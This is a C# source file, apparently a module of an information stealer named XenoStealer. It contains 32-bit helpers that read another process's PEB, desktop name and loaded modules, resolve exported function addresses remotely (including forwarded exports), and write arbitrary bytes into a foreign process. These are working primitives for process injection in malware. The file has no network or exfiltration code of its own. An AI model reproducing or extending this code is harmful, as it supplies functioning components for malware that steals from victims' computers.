using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static XenoStealer.InternalStructs;

namespace XenoStealer
{
    public static class Utils32
    {

        public static string GetProcessDesktopName32(IntPtr hProcess)
        {
            if (hProcess == IntPtr.Zero)
            {
                return null;
            }
            InternalStructs.PROCESS_BASIC_INFORMATION PBI = new InternalStructs.PROCESS_BASIC_INFORMATION();
            uint PBI_size = (uint)Marshal.SizeOf(PBI);
            uint NTread_out = 0;
            UIntPtr Rread_out = UIntPtr.Zero;
            int errcode = NativeMethods.NtQueryPbi32(hProcess, PROCESSINFOCLASS.ProcessBasicInformation, ref PBI, PBI_size, ref NTread_out);

            if (errcode != 0)
            {
                return null;
            }

            if (PBI.PebBaseAddress == IntPtr.Zero)
            {
                return null;
            }

            IntPtr RTLaddr = InternalStructs32.GetRTL32(PBI.PebBaseAddress);

            int pRTLDataSize = Marshal.SizeOf(typeof(UINTRESULT));
            IntPtr pRTLData = Marshal.AllocHGlobal(pRTLDataSize);

            if (!NativeMethods.ReadProcessMemory(hProcess, RTLaddr, pRTLData, (UIntPtr)pRTLDataSize, ref Rread_out))
            {
                Marshal.FreeHGlobal(pRTLData);
                return null;
            }

            IntPtr pRTL32 = (IntPtr)Marshal.PtrToStructure<UINTRESULT>(pRTLData).Value;
            Marshal.FreeHGlobal(pRTLData);

            int RTLDataSize = Marshal.SizeOf<InternalStructs32.RTL_USER_PROCESS_PARAMETERS32>();
            IntPtr RTLData = Marshal.AllocHGlobal(RTLDataSize);

            if (!NativeMethods.ReadProcessMemory(hProcess, pRTL32, RTLData, (UIntPtr)RTLDataSize, ref Rread_out))
            {
                Marshal.FreeHGlobal(RTLData);
                return null;
            }
            InternalStructs32.RTL_USER_PROCESS_PARAMETERS32 RTL = Marshal.PtrToStructure<InternalStructs32.RTL_USER_PROCESS_PARAMETERS32>(RTLData);
            Marshal.FreeHGlobal(RTLData);

            IntPtr unicodeStringPtr = Marshal.AllocHGlobal(RTL.DesktopInfo.Length);

            if (!NativeMethods.ReadProcessMemory(hProcess, (IntPtr)RTL.DesktopInfo.Buffer, unicodeStringPtr, (UIntPtr)RTL.DesktopInfo.Length, ref Rread_out))
            {
                Marshal.FreeHGlobal(unicodeStringPtr);
                return null;
            }

            string desktopName = Marshal.PtrToStringUni(unicodeStringPtr, RTL.DesktopInfo.Length / 2);//divide by 2 for real string length (its unicode)

            Marshal.FreeHGlobal(unicodeStringPtr);

            return desktopName;

        }

        public static uint GetRemoteModuleHandle32Bit(IntPtr hProcess, string DllBaseName, int max_flink_count = 600)
        {
            if (hProcess == IntPtr.Zero)
            {
                throw new Exception("The supplied hProcess is Null!");
            }
            InternalStructs.PROCESS_BASIC_INFORMATION PBI = new InternalStructs.PROCESS_BASIC_INFORMATION();
            uint PBI_size = (uint)Marshal.SizeOf(PBI);
            uint NTread_out = 0;
            UIntPtr Rread_out = UIntPtr.Zero;
            int errcode = NativeMethods.NtQueryPbi32(hProcess, PROCESSINFOCLASS.ProcessBasicInformation, ref PBI, PBI_size, ref NTread_out);

            if (errcode != 0)
            {
                throw new Exception("couldnt read PBI. ERR CODE: " + errcode);
            }

            if (PBI.PebBaseAddress == IntPtr.Zero)
            {
                return 0;
            }

            IntPtr ldrAddr = InternalStructs32.GetLdr32(PBI.PebBaseAddress);
            int pLdrDataSize = Marshal.SizeOf(typeof(UINTRESULT));
            IntPtr pLdrData = Marshal.AllocHGlobal(pLdrDataSize);


            if (!NativeMethods.ReadProcessMemory(hProcess, ldrAddr, pLdrData, (UIntPtr)pLdrDataSize, ref Rread_out))
            {
                Marshal.FreeHGlobal(pLdrData);
                throw new Exception("couldnt read pLdrData. ERR CODE: " + Marshal.GetLastWin32Error());
            }

            IntPtr pLdr32 = (IntPtr)Marshal.PtrToStructure<UINTRESULT>(pLdrData).Value;
            Marshal.FreeHGlobal(pLdrData);

            if (pLdr32 == IntPtr.Zero)
            {
                return 0;
            }

            if (!NativeMethods.ReadProcessMemory(hProcess, ldrAddr, pLdrData, (UIntPtr)pLdrDataSize, ref Rread_out))
            {
                Marshal.FreeHGlobal(pLdrData);
                throw new Exception("couldnt read pLdrData. ERR CODE: " + Marshal.GetLastWin32Error());
            }

            InternalStructs32.PEB_LDR_DATA32 ldr32;

            int ldr32Size = Marshal.SizeOf(typeof(InternalStructs32.PEB_LDR_DATA32));
            IntPtr ldr32addr = Marshal.AllocHGlobal(ldr32Size);

            if (!NativeMethods.ReadProcessMemory(hProcess, pLdr32, ldr32addr, (UIntPtr)ldr32Size, ref Rread_out))
            {
                Marshal.FreeHGlobal(ldr32addr);
                throw new Exception("couldnt read ldr32. ERR CODE: " + Marshal.GetLastWin32Error());
            }

            ldr32 = Marshal.PtrToStructure<InternalStructs32.PEB_LDR_DATA32>(ldr32addr);
            Marshal.FreeHGlobal(ldr32addr);

            uint entry = ldr32.InLoadOrderModuleList.Flink;
            uint head = (uint)ldrAddr + (uint)Marshal.OffsetOf(typeof(InternalStructs32.PEB_LDR_DATA32), "InLoadOrderModuleList");

            int LdrDataTableSize = Marshal.SizeOf(typeof(InternalStructs32.LDR_DATA_TABLE_ENTRY32_SNAP));
            IntPtr LdrDataTableAddr = Marshal.AllocHGlobal(LdrDataTableSize);
            uint hModule = 0;
            uint count = 0;
            while (entry != head && count < max_flink_count)
            {
                count++;
                if (!NativeMethods.ReadProcessMemory(hProcess, (IntPtr)entry, LdrDataTableAddr, (UIntPtr)LdrDataTableSize, ref Rread_out))
                {
                    break;
                }

                InternalStructs32.LDR_DATA_TABLE_ENTRY32_SNAP LdrDataTable = Marshal.PtrToStructure<InternalStructs32.LDR_DATA_TABLE_ENTRY32_SNAP>(LdrDataTableAddr);

                if (DllBaseName == null)
                {
                    hModule = LdrDataTable.DllBase;
                    break;
                }


                entry = LdrDataTable.InLoadOrderLinks.Flink;

                if ((LdrDataTable.BaseDllName.Length / 2) != DllBaseName.Length)
                {
                    continue;
                }

                IntPtr currentModuleNameBufferAddr = Marshal.AllocHGlobal(LdrDataTable.BaseDllName.Length);
                if (!NativeMethods.ReadProcessMemory(hProcess, (IntPtr)LdrDataTable.BaseDllName.Buffer, currentModuleNameBufferAddr, (UIntPtr)LdrDataTable.BaseDllName.Length, ref Rread_out))
                {
                    Marshal.FreeHGlobal(currentModuleNameBufferAddr);
                    break;
                }
                string baseDllname = Marshal.PtrToStringUni(currentModuleNameBufferAddr, LdrDataTable.BaseDllName.Length / 2);
                Marshal.FreeHGlobal(currentModuleNameBufferAddr);
                if (baseDllname.ToLower() == DllBaseName.ToLower())
                {
                    hModule = LdrDataTable.DllBase;
                    break;
                }
            }
            Marshal.FreeHGlobal(LdrDataTableAddr);
            return hModule;
        }

        private static string ReadRemoteAnsiString32(IntPtr hProcess, IntPtr lpAddress)
        {
            string result = "";
            UIntPtr Rread_out = UIntPtr.Zero;
            IntPtr byteBuffer = Marshal.AllocHGlobal(1);
            while (true)
            {
                if (!NativeMethods.ReadProcessMemory(hProcess, (IntPtr)lpAddress, byteBuffer, (UIntPtr)1, ref Rread_out))
                {
                    Marshal.FreeHGlobal(byteBuffer);
                    throw new Exception("couldnt read AnsiString. ERR CODE: " + Marshal.GetLastWin32Error());
                }
                byte Ch = Marshal.ReadByte(byteBuffer);
                if (Ch == 0)
                {
                    break;
                }
                result += (char)Ch;
                lpAddress += 1;
            }
            return result;
        }

        public static bool WriteBytesToProcess32(IntPtr handle, IntPtr address, byte[] data)
        {
            IntPtr dataPtr = Marshal.AllocHGlobal(data.Length);
            Marshal.Copy(data, 0, dataPtr, data.Length);
            bool result = NativeMethods.WriteProcessMemory(handle, address, dataPtr, (IntPtr)data.Length, out IntPtr BytesWritten);
            Marshal.FreeHGlobal(dataPtr);
            return result && BytesWritten == (IntPtr)data.Length;
        }

        public static uint GetNtHeader32Addr(IntPtr hProcess, uint hModule)
        {
            int dosHeaderSize = Marshal.SizeOf(typeof(IMAGE_DOS_HEADER));
            IntPtr dosHeaderaddr = Marshal.AllocHGlobal(dosHeaderSize);
            UIntPtr Rread_out = UIntPtr.Zero;
            if (!NativeMethods.ReadProcessMemory(hProcess, (IntPtr)hModule, dosHeaderaddr, (UIntPtr)dosHeaderSize, ref Rread_out))
            {
                Marshal.FreeHGlobal(dosHeaderaddr);
                throw new Exception("couldnt read DosHeader. ERR CODE: " + Marshal.GetLastWin32Error());
            }
            IMAGE_DOS_HEADER dosHeader = Marshal.PtrToStructure<IMAGE_DOS_HEADER>(dosHeaderaddr);
            Marshal.FreeHGlobal(dosHeaderaddr);
            return hModule + (uint)dosHeader.e_lfanew;
        }

        public static InternalStructs32.IMAGE_NT_HEADERS32 GetNtHeader32(IntPtr hProcess, uint hModule)
        {
            UIntPtr Rread_out = UIntPtr.Zero;
            int ntHeaderSize = Marshal.SizeOf(typeof(InternalStructs32.IMAGE_NT_HEADERS32));
            IntPtr ntHeaderaddr = Marshal.AllocHGlobal(ntHeaderSize);
            if (!NativeMethods.ReadProcessMemory(hProcess, (IntPtr)GetNtHeader32Addr(hProcess, hModule), ntHeaderaddr, (UIntPtr)ntHeaderSize, ref Rread_out))
            {
                Marshal.FreeHGlobal(ntHeaderaddr);
                throw new Exception("couldnt read NTHeader. ERR CODE: " + Marshal.GetLastWin32Error());
            }
            InternalStructs32.IMAGE_NT_HEADERS32 ntHeader = Marshal.PtrToStructure<InternalStructs32.IMAGE_NT_HEADERS32>(ntHeaderaddr);
            Marshal.FreeHGlobal(ntHeaderaddr);
            return ntHeader;
        }

        public static uint GetRemoteProcAddress32Bit(IntPtr hProcess, uint hModule, string FunctionName)
        {
            if (hModule == 0)
            {
                throw new Exception("couldnt read hModule is null or 0.");
            }
            UIntPtr Rread_out = UIntPtr.Zero;
            InternalStructs32.IMAGE_NT_HEADERS32 ntHeader = GetNtHeader32(hProcess, hModule);

            int IMAGE_DIRECTORY_ENTRY_EXPORT = 0;

            IMAGE_DATA_DIRECTORY dataTable = ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

            if (dataTable.Size == 0 || dataTable.VirtualAddress == 0)
            {
                return 0;
            }

            int explortDirSize = Marshal.SizeOf(typeof(IMAGE_EXPORT_DIRECTORY));
            IntPtr exportDiraddr = Marshal.AllocHGlobal(explortDirSize);

            if (!NativeMethods.ReadProcessMemory(hProcess, (IntPtr)(hModule + dataTable.VirtualAddress), exportDiraddr, (UIntPtr)explortDirSize, ref Rread_out))
            {
                Marshal.FreeHGlobal(exportDiraddr);
                throw new Exception("couldnt read IMAGE EXPORT DIRECTORY. ERR CODE: " + Marshal.GetLastWin32Error());
            }

            IMAGE_EXPORT_DIRECTORY exportDir = Marshal.PtrToStructure<IMAGE_EXPORT_DIRECTORY>(exportDiraddr);
            Marshal.FreeHGlobal(exportDiraddr);
            if (exportDir.NumberOfNames == 0)
            {
                return 0;
            }

            int rvaTableSize = (int)exportDir.NumberOfFunctions * Marshal.SizeOf(typeof(int));
            IntPtr rvaTableAddr = Marshal.AllocHGlobal(rvaTableSize);

            if (!NativeMethods.ReadProcessMemory(hProcess, (IntPtr)(hModule + exportDir.AddressOfFunctions), rvaTableAddr, (UIntPtr)rvaTableSize, ref Rread_out))
            {
                Marshal.FreeHGlobal(rvaTableAddr);
                throw new Exception("couldnt read RVA table. ERR CODE: " + Marshal.GetLastWin32Error());
            }
            uint[] rvaTable = new uint[(int)exportDir.NumberOfFunctions];
            for (int i = 0; i < (int)exportDir.NumberOfFunctions; i++)
            {
                rvaTable[i] = Marshal.PtrToStructure<UINTRESULT>(rvaTableAddr + (i * 4)).Value;
            }
            Marshal.FreeHGlobal(rvaTableAddr);


            int ordTableSize = (int)exportDir.NumberOfFunctions * Marshal.SizeOf(typeof(short));
            IntPtr ordTableAddr = Marshal.AllocHGlobal(ordTableSize);
            if (!NativeMethods.ReadProcessMemory(hProcess, (IntPtr)(hModule + exportDir.AddressOfNameOrdinals), ordTableAddr, (UIntPtr)ordTableSize, ref Rread_out))
            {
                Marshal.FreeHGlobal(ordTableAddr);
                throw new Exception("couldnt read ORD table. ERR CODE: " + Marshal.GetLastWin32Error());
            }
            ushort[] ordTable = new ushort[(int)exportDir.NumberOfFunctions];
            for (int i = 0; i < (int)exportDir.NumberOfFunctions; i++)
            {
                ordTable[i] = Marshal.PtrToStructure<USHORTRESULT>(ordTableAddr + (i * 2)).Value;
            }
            Marshal.FreeHGlobal(ordTableAddr);


            int nameTableSize = (int)exportDir.NumberOfNames * Marshal.SizeOf(typeof(int));
            IntPtr nameTableAddr = Marshal.AllocHGlobal(nameTableSize);
            if (!NativeMethods.ReadProcessMemory(hProcess, (IntPtr)(hModule + exportDir.AddressOfNames), nameTableAddr, (UIntPtr)nameTableSize, ref Rread_out))
            {
                Marshal.FreeHGlobal(nameTableAddr);
                throw new Exception("couldnt read NAME table. ERR CODE: " + Marshal.GetLastWin32Error());
            }
            uint[] nameTable = new uint[(int)exportDir.NumberOfNames];
            for (int i = 0; i < (int)exportDir.NumberOfNames; i++)
            {
                nameTable[i] = Marshal.PtrToStructure<UINTRESULT>(nameTableAddr + (i * 4)).Value;
            }
            Marshal.FreeHGlobal(nameTableAddr);

            int nameBufferLen = FunctionName.Length + 1;//for the string terminating null byte
            IntPtr nameBuffer = Marshal.AllocHGlobal(nameBufferLen);
            uint result = 0;
            for (int i = 0; i < nameTable.Length; i++)
            {
                if (!NativeMethods.ReadProcessMemory(hProcess, (IntPtr)(hModule + nameTable[i]), nameBuffer, (UIntPtr)nameBufferLen, ref Rread_out))
                {
                    Marshal.FreeHGlobal(nameBuffer);
                    throw new Exception("couldnt read name buffer. ERR CODE: " + Marshal.GetLastWin32Error());
                }
                byte SecondLastChar = Marshal.ReadByte(nameBuffer + nameBufferLen - 2);
                byte lastChar = Marshal.ReadByte(nameBuffer + nameBufferLen - 1);
                if (lastChar == 0 && SecondLastChar != 0) //make sure the last char is null and the second last char is not null
                {
                    uint functionAddress = (uint)rvaTable[ordTable[i]];
                    string RetrivedFunctionName = Marshal.PtrToStringAnsi(nameBuffer);

                    if (RetrivedFunctionName == FunctionName)
                    {

                        if (functionAddress >= dataTable.VirtualAddress && functionAddress < dataTable.VirtualAddress + dataTable.Size)
                        {
                            string ForwarderString = ReadRemoteAnsiString32(hProcess, (IntPtr)(hModule + functionAddress));
                            if (!ForwarderString.Contains("."))
                            {
                                Marshal.FreeHGlobal(nameBuffer);
                                throw new Exception("Couldnt the Forwarder info!");
                            }
                            string[] Forwarder_info = ForwarderString.Split('.');
                            string fowardedDll = string.Join(".", Forwarder_info.Take(Forwarder_info.Length - 1).ToArray()) + ".dll";
                            string SearchElement = Forwarder_info[Forwarder_info.Length - 1];
                            if (SearchElement.Contains("#"))
                            {
                                Marshal.FreeHGlobal(nameBuffer);
                                throw new Exception("Ordinal forwarder function is not supported at this time!");
                            }
                            else
                            {
                                uint newModuleAddress = GetRemoteModuleHandle32Bit(hProcess, fowardedDll);
                                if (newModuleAddress == 0)
                                {
                                    Marshal.FreeHGlobal(nameBuffer);
                                    throw new Exception("Couldnt the Forwarder dll!");
                                }
                                return GetRemoteProcAddress32Bit(hProcess, newModuleAddress, SearchElement);
                            }
                        }
                        else
                        {
                            result = hModule + functionAddress;
                        }
                        break;
                    }
                }
            }
            Marshal.FreeHGlobal(nameBuffer);
            return result;
        }

    }
}
